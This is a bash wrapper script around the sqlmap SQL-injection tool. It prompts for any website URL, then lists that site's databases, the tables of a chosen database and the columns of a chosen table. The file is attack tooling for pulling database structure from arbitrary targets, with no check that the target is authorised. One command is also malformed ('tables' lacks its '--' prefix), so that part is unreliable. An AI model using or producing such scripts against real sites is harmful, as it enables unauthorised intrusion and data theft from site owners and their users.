clear 
figlet -f big sqlmap |lolcat
echo -------------------------------------------------------------
echo enter url or website....
read sql
cd sqlmap
python sqlmap.py -u $sql --dbs
echo ------------------------------------------------------------
echo enter Database...
read dbs
python sqlmap.py -u $sql -D $dbs tables
echo ------------------------------------------------------------
echo enter table...
read t
python sqlmap.py -u $sql -D $dbs -T $t --column
echo ""
